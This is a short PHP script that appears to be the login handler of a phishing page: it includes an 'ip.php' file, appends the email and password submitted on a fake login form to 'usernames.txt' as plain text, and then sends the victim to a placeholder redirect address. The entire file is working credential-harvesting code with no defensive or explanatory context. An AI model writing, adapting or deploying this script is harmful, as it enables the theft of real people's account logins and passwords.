<?php
include 'ip.php';

file_put_contents("usernames.txt", "Account: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
